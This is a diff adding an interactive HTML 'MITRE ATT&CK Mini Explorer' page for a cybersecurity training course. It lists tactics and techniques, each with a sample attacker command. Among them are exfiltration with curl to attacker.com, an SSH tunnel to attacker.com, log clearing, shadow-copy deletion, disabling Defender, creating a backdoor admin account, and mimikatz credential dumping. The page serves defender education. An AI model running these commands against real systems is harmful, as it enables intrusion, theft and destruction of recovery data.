@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MITRE ATT&CK Mini Explorer</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    background: #0d1117;
+    color: #e6edf3;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  header {
+    text-align: center;
+    margin-bottom: 28px;
+    padding: 20px;
+    background: linear-gradient(135deg, #1c2333 0%, #161b27 100%);
+    border-radius: 12px;
+    border: 1px solid #30363d;
+  }
+  header h1 { font-size: 1.8rem; color: #58a6ff; margin-bottom: 6px; }
+  header p { color: #8b949e; font-size: 0.9rem; }
+  .badge {
+    display: inline-block;
+    background: #21262d;
+    border: 1px solid #30363d;
+    color: #8b949e;
+    border-radius: 20px;
+    padding: 3px 12px;
+    font-size: 0.75rem;
+    margin-top: 8px;
+  }
+  .tactics-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(175px, 1fr));
+    gap: 12px;
+    margin-bottom: 24px;
+  }
+  .tactic-card {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 10px;
+    padding: 16px;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    position: relative;
+    overflow: hidden;
+  }
+  .tactic-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 3px;
+    background: var(--accent);
+  }
+  .tactic-card:hover {
+    border-color: var(--accent);
+    transform: translateY(-2px);
+    box-shadow: 0 4px 16px rgba(0,0,0,0.4);
+  }
+  .tactic-card.active {
+    border-color: var(--accent);
+    background: #1c2333;
+    box-shadow: 0 0 0 2px var(--accent);
+  }
+  .tactic-id {
+    font-size: 0.7rem;
+    font-family: monospace;
+    color: #8b949e;
+    margin-bottom: 4px;
+  }
+  .tactic-name {
+    font-size: 0.95rem;
+    font-weight: 600;
+    color: #e6edf3;
+    margin-bottom: 6px;
+    line-height: 1.3;
+  }
+  .tactic-desc {
+    font-size: 0.78rem;
+    color: #8b949e;
+    line-height: 1.4;
+  }
+  .tactic-count {
+    display: inline-block;
+    margin-top: 8px;
+    font-size: 0.72rem;
+    color: var(--accent);
+    background: rgba(88, 166, 255, 0.1);
+    padding: 2px 8px;
+    border-radius: 10px;
+  }
+  .detail-panel {
+    display: none;
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 12px;
+    padding: 24px;
+    margin-bottom: 24px;
+    animation: slideIn 0.2s ease;
+  }
+  .detail-panel.visible { display: block; }
+  @keyframes slideIn {
+    from { opacity: 0; transform: translateY(-8px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  .detail-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 20px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid #30363d;
+  }
+  .detail-icon {
+    width: 44px; height: 44px;
+    border-radius: 10px;
+    background: var(--active-accent);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 1.4rem;
+  }
+  .detail-meta h2 { font-size: 1.2rem; color: #e6edf3; }
+  .detail-meta .detail-id {
+    font-size: 0.8rem;
+    font-family: monospace;
+    color: #8b949e;
+  }
+  .techniques-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 12px;
+  }
+  .technique-card {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 14px;
+    border-left: 3px solid var(--active-accent);
+  }
+  .tech-id {
+    font-family: monospace;
+    font-size: 0.75rem;
+    color: var(--active-accent);
+    margin-bottom: 4px;
+  }
+  .tech-name {
+    font-size: 0.9rem;
+    font-weight: 600;
+    color: #e6edf3;
+    margin-bottom: 6px;
+  }
+  .tech-desc {
+    font-size: 0.8rem;
+    color: #8b949e;
+    line-height: 1.5;
+  }
+  .tech-example {
+    margin-top: 8px;
+    padding: 6px 10px;
+    background: #161b22;
+    border-radius: 6px;
+    font-size: 0.75rem;
+    color: #3fb950;
+    font-family: monospace;
+  }
+  .close-btn {
+    margin-top: 16px;
+    padding: 8px 20px;
+    background: transparent;
+    border: 1px solid #30363d;
+    color: #8b949e;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 0.85rem;
+    transition: all 0.2s;
+  }
+  .close-btn:hover { border-color: #58a6ff; color: #58a6ff; }
+  footer {
+    text-align: center;
+    color: #484f58;
+    font-size: 0.8rem;
+    margin-top: 20px;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>MITRE ATT&CK Mini Explorer</h1>
+  <p>Click any tactic card to explore techniques and real-world examples</p>
+  <span class="badge">14 Tactics | Enterprise Matrix | v15</span>
+</header>
+
+<div class="tactics-grid" id="tacticsGrid"></div>
+<div class="detail-panel" id="detailPanel"></div>
+
+<footer>MITRE ATT&CK® | TechPath Cybersecurity Training | Month 4 — SOC & SIEM</footer>
+
+<script>
+const tactics = [
+  {
+    id: "TA0043", name: "Reconnaissance", icon: "🔍",
+    color: "#8b949e", desc: "Gather information before attacking",
+    techniques: [
+      { id: "T1595", name: "Active Scanning", desc: "Scan victim infrastructure to identify open ports, services, and vulnerabilities.", example: "nmap -sV -p 80,443,8080 target.com" },
+      { id: "T1598", name: "Phishing for Information", desc: "Send spear-phishing messages to extract credentials or internal data without malware delivery.", example: "Fake IT reset portal to harvest AD credentials" },
+      { id: "T1589", name: "Gather Victim Identity Info", desc: "Collect employee names, emails, and account information from LinkedIn, WHOIS, or breach databases.", example: "linkedin2username + HaveIBeenPwned lookup" },
+      { id: "T1590", name: "Gather Victim Network Info", desc: "Identify IP ranges, ASN, DNS servers, and network topology from public sources.", example: "shodan.io, censys.io, ARIN WHOIS" }
+    ]
+  },
+  {
+    id: "TA0042", name: "Resource Development", icon: "🏗️",
+    color: "#e3b341", desc: "Build attacker infrastructure",
+    techniques: [
+      { id: "T1583", name: "Acquire Infrastructure", desc: "Purchase or rent servers, domains, or cloud accounts to host attack infrastructure.", example: "Register c2-server.net + VPS in bulletproof hosting" },
+      { id: "T1584", name: "Compromise Infrastructure", desc: "Compromise third-party systems to proxy attacks and obscure attribution.", example: "Hack a legitimate web server to host phishing page" },
+      { id: "T1587", name: "Develop Capabilities", desc: "Build custom malware, exploits, or tools for the specific operation.", example: "Write a custom C2 implant in C++ to evade AV" }
+    ]
+  },
+  {
+    id: "TA0001", name: "Initial Access", icon: "🚪",
+    color: "#f85149", desc: "Gain first foothold in the environment",
+    techniques: [
+      { id: "T1566", name: "Phishing", desc: "Send malicious email attachments or links to compromise user endpoints.", example: "Word doc with malicious macro → mshta.exe payload" },
+      { id: "T1190", name: "Exploit Public-Facing App", desc: "Attack internet-exposed services using known CVEs or zero-days.", example: "CVE-2021-44228 Log4Shell against public API" },
+      { id: "T1133", name: "External Remote Services", desc: "Use legitimate remote access tools (VPN, RDP, Citrix) with stolen credentials.", example: "RDP login from attacker IP using dumped creds" },
+      { id: "T1078", name: "Valid Accounts", desc: "Use legitimate credentials obtained via phishing, purchase, or credential stuffing.", example: "O365 spray with passwords from 2023 breach" }
+    ]
+  },
+  {
+    id: "TA0002", name: "Execution", icon: "⚡",
+    color: "#ff7b72", desc: "Run malicious code on victim systems",
+    techniques: [
+      { id: "T1059.001", name: "PowerShell", desc: "Use PowerShell to run commands, download payloads, or execute scripts in memory.", example: "powershell -enc <base64> -NoProfile -NonI" },
+      { id: "T1059.003", name: "Windows Command Shell", desc: "Use cmd.exe to run commands, batch scripts, or chain tool execution.", example: "cmd.exe /c whoami && net user && ipconfig" },
+      { id: "T1047", name: "WMI Execution", desc: "Use Windows Management Instrumentation to execute commands remotely and stealthily.", example: "wmic /node:TARGET process call create 'malware.exe'" },
+      { id: "T1053.005", name: "Scheduled Task", desc: "Create scheduled tasks to execute code at set times or on trigger events.", example: "schtasks /create /sc minute /tn 'Update' /tr malware.exe" }
+    ]
+  },
+  {
+    id: "TA0003", name: "Persistence", icon: "🔒",
+    color: "#ffa657", desc: "Maintain access across reboots and remediations",
+    techniques: [
+      { id: "T1547.001", name: "Registry Run Keys", desc: "Add malware paths to HKCU\\Run or HKLM\\Run for automatic startup.", example: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /d malware.exe" },
+      { id: "T1053.005", name: "Scheduled Tasks", desc: "Create tasks that execute malware on login, startup, or time-based triggers.", example: "schtasks /create /tn WindowsUpdate /tr payload.exe /sc onlogon" },
+      { id: "T1543.003", name: "Windows Service", desc: "Install malicious code as a Windows service for persistent background execution.", example: "sc create evilsvc binpath= C:\\evil.exe start= auto" },
+      { id: "T1136.001", name: "Create Local Account", desc: "Create a new local administrator account as a backdoor.", example: "net user backdoor P@ss123 /add && net localgroup administrators backdoor /add" }
+    ]
+  },
+  {
+    id: "TA0004", name: "Privilege Escalation", icon: "⬆️",
+    color: "#d2a8ff", desc: "Gain higher-level permissions",
+    techniques: [
+      { id: "T1134", name: "Access Token Manipulation", desc: "Create or steal process tokens to impersonate privileged users.", example: "Cobalt Strike: steal_token <PID of SYSTEM process>" },
+      { id: "T1068", name: "Exploit Vulnerability", desc: "Use local privilege escalation CVEs to gain SYSTEM or root.", example: "PrintNightmare (CVE-2021-1675) → SYSTEM shell" },
+      { id: "T1548.002", name: "Bypass UAC", desc: "Circumvent User Account Control to execute with elevated privileges.", example: "fodhelper.exe registry hijack → high-integrity shell" }
+    ]
+  },
+  {
+    id: "TA0005", name: "Defense Evasion", icon: "🥷",
+    color: "#56d364", desc: "Avoid detection and analysis",
+    techniques: [
+      { id: "T1070.001", name: "Clear Windows Event Logs", desc: "Delete security event logs to destroy forensic evidence.", example: "wevtutil cl Security && wevtutil cl System" },
+      { id: "T1027", name: "Obfuscated Files or Info", desc: "Encode or encrypt payloads to bypass signature detection.", example: "powershell -enc <base64_payload>" },
+      { id: "T1562.001", name: "Disable Security Tools", desc: "Turn off AV, EDR, or logging to prevent detection.", example: "Set-MpPreference -DisableRealtimeMonitoring $true" },
+      { id: "T1036", name: "Masquerading", desc: "Disguise malicious files or processes as legitimate system components.", example: "Rename malware.exe to svchost.exe and run from %TEMP%" }
+    ]
+  },
+  {
+    id: "TA0006", name: "Credential Access", icon: "🗝️",
+    color: "#79c0ff", desc: "Steal credentials and authentication material",
+    techniques: [
+      { id: "T1003.001", name: "LSASS Memory Dump", desc: "Dump LSASS process memory to extract NTLM hashes and Kerberos tickets.", example: "mimikatz sekurlsa::logonpasswords" },
+      { id: "T1558.003", name: "Kerberoasting", desc: "Request Kerberos service tickets and crack them offline to recover service account passwords.", example: "Rubeus.exe kerberoast /outfile:hashes.txt" },
+      { id: "T1110", name: "Brute Force", desc: "Systematically try passwords against authentication services.", example: "crackmapexec smb targets.txt -u users.txt -p passwords.txt" }
+    ]
+  },
+  {
+    id: "TA0007", name: "Discovery", icon: "🗺️",
+    color: "#58a6ff", desc: "Learn about the victim environment",
+    techniques: [
+      { id: "T1046", name: "Network Service Discovery", desc: "Scan internal network to find open ports, services, and additional targets.", example: "nmap -sV 192.168.1.0/24 -p 22,80,443,445,3389" },
+      { id: "T1087.002", name: "Domain Account Discovery", desc: "Enumerate domain users and groups to identify high-value targets.", example: "net user /domain && net group 'Domain Admins' /domain" },
+      { id: "T1018", name: "Remote System Discovery", desc: "Identify other hosts on the network using ping sweeps or ARP.", example: "arp -a && for /l %i in (1,1,254) do ping -n 1 192.168.1.%i" }
+    ]
+  },
+  {
+    id: "TA0008", name: "Lateral Movement", icon: "↔️",
+    color: "#ffa657", desc: "Move between systems in the environment",
+    techniques: [
+      { id: "T1550.002", name: "Pass the Hash", desc: "Authenticate to remote systems using captured NTLM hashes without knowing the plaintext password.", example: "mimikatz sekurlsa::pth /user:admin /domain:corp /ntlm:<hash>" },
+      { id: "T1021.001", name: "Remote Desktop Protocol", desc: "Use RDP to log onto remote systems interactively with stolen credentials.", example: "mstsc /v:TARGET_IP (with harvested credentials)" },
+      { id: "T1021.002", name: "SMB/Windows Admin Shares", desc: "Use SMB to copy files or execute commands via administrative shares.", example: "psexec.exe \\\\TARGET -u admin -p pass cmd.exe" }
+    ]
+  },
+  {
+    id: "TA0009", name: "Collection", icon: "📦",
+    color: "#e3b341", desc: "Gather data of interest before exfiltration",
+    techniques: [
+      { id: "T1083", name: "File and Directory Discovery", desc: "Enumerate file systems to locate sensitive data, credentials files, or documents.", example: "dir /s /b C:\\Users\\*.xlsx C:\\Users\\*.docx" },
+      { id: "T1074.001", name: "Local Data Staging", desc: "Aggregate collected data in a single location before exfiltration.", example: "7z a C:\\ProgramData\\archive.zip C:\\Users\\admin\\Documents" },
+      { id: "T1113", name: "Screen Capture", desc: "Take screenshots of user desktops to capture sensitive information.", example: "Add-Type -Assembly PresentationCore; [System.Windows.Media...screenshot]" }
+    ]
+  },
+  {
+    id: "TA0011", name: "Command & Control", icon: "📡",
+    color: "#8b949e", desc: "Communicate with compromised systems",
+    techniques: [
+      { id: "T1071.001", name: "Web Protocols (HTTP/S)", desc: "Use HTTP or HTTPS to blend C2 traffic with normal web browsing.", example: "Cobalt Strike HTTP beacon to attacker server on port 443" },
+      { id: "T1071.004", name: "DNS", desc: "Encode C2 commands in DNS queries and responses to bypass egress filtering.", example: "iodine / dnscat2 tunneling over DNS UDP 53" },
+      { id: "T1572", name: "Protocol Tunneling", desc: "Encapsulate C2 traffic inside legitimate protocols (SSH, RDP) to evade inspection.", example: "SSH tunnel: ssh -R 8080:localhost:80 attacker.com" }
+    ]
+  },
+  {
+    id: "TA0010", name: "Exfiltration", icon: "📤",
+    color: "#f85149", desc: "Steal data out of the environment",
+    techniques: [
+      { id: "T1041", name: "Exfil Over C2 Channel", desc: "Send stolen data back through the established C2 communication channel.", example: "Upload archive via existing Cobalt Strike HTTPS beacon" },
+      { id: "T1048.003", name: "Exfil Over HTTPS", desc: "Upload data to attacker-controlled cloud storage or file sharing services.", example: "curl -T archive.zip https://attacker.com/upload" },
+      { id: "T1567.002", name: "Exfil to Cloud Storage", desc: "Upload sensitive data to legitimate cloud services (OneDrive, Dropbox, MEGA) to blend with normal traffic.", example: "rclone copy /sensitive/data mega:exfil_2024" }
+    ]
+  },
+  {
+    id: "TA0040", name: "Impact", icon: "💥",
+    color: "#ff7b72", desc: "Disrupt, destroy, or manipulate systems",
+    techniques: [
+      { id: "T1486", name: "Data Encrypted for Impact", desc: "Encrypt files and demand ransom — the defining action of ransomware attacks.", example: "Conti/LockBit ransomware encrypts all drives and drops ransom note" },
+      { id: "T1490", name: "Inhibit System Recovery", desc: "Delete backups and shadow copies to prevent recovery without paying ransom.", example: "vssadmin delete shadows /all /quiet && bcdedit /set {default} recoveryenabled no" },
+      { id: "T1498", name: "Network Denial of Service", desc: "Flood target networks to deny legitimate access.", example: "DDoS via botnet — SYN flood against public-facing IP" }
+    ]
+  }
+];
+
+const colorMap = {
+  "TA0043": "#8b949e", "TA0042": "#e3b341", "TA0001": "#f85149",
+  "TA0002": "#ff7b72", "TA0003": "#ffa657", "TA0004": "#d2a8ff",
+  "TA0005": "#56d364", "TA0006": "#79c0ff", "TA0007": "#58a6ff",
+  "TA0008": "#ffa657", "TA0009": "#e3b341", "TA0011": "#8b949e",
+  "TA0010": "#f85149", "TA0040": "#ff7b72"
+};
+
+let activeId = null;
+
+function renderTactics() {
+  const grid = document.getElementById('tacticsGrid');
+  grid.innerHTML = tactics.map(t => `
+    <div class="tactic-card ${activeId === t.id ? 'active' : ''}"
+         style="--accent: ${t.color}"
+         onclick="selectTactic('${t.id}')">
+      <div class="tactic-id">${t.id}</div>
+      <div class="tactic-name">${t.icon} ${t.name}</div>
+      <div class="tactic-desc">${t.desc}</div>
+      <span class="tactic-count">${t.techniques.length} techniques</span>
+    </div>
+  `).join('');
+}
+
+function selectTactic(id) {
+  if (activeId === id) {
+    activeId = null;
+    document.getElementById('detailPanel').classList.remove('visible');
+    renderTactics();
+    return;
+  }
+  activeId = id;
+  const tactic = tactics.find(t => t.id === id);
+  const color = colorMap[id] || '#58a6ff';
+  const panel = document.getElementById('detailPanel');
+  panel.style.setProperty('--active-accent', color);
+  panel.innerHTML = `
+    <div class="detail-header">
+      <div class="detail-icon">${tactic.icon}</div>
+      <div class="detail-meta">
+        <h2>${tactic.name}</h2>
+        <div class="detail-id">${tactic.id} &middot; ${tactic.techniques.length} techniques shown</div>
+      </div>
+    </div>
+    <div class="techniques-grid">
+      ${tactic.techniques.map(tech => `
+        <div class="technique-card">
+          <div class="tech-id">${tech.id}</div>
+          <div class="tech-name">${tech.name}</div>
+          <div class="tech-desc">${tech.desc}</div>
+          ${tech.example ? `<div class="tech-example">$ ${tech.example}</div>` : ''}
+        </div>
+      `).join('')}
+    </div>
+    <button class="close-btn" onclick="closePanel()">✕ Close Panel</button>
+  `;
+  panel.classList.add('visible');
+  panel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  renderTactics();
+}
+
+function closePanel() {
+  activeId = null;
+  document.getElementById('detailPanel').classList.remove('visible');
+  renderTactics();
+}
+
+renderTactics();
+</script>
+</body>
+</html>
